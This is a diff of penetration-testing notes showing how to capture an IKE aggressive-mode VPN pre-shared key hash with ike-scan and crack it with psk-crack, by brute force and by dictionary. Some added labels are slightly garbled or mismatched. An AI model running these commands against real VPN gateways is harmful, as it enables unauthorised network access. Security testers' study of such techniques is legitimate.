@@ -22,8 +22,11 @@ ike-scan -A 192.168.207.134
 ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key
 	-Once you have you psk file to crack you're stuck with two options psk-crack and cain
 psk-crack -b 5 192-168-207-134key
+	-brute force cracking mode (36 characters)
 psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+	-brute force cracking mode (63 characters)
 psk-crack -d /path/to/dictionary 192-168-207-134key
+	-dictionary attackresearch
 	http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
 
 
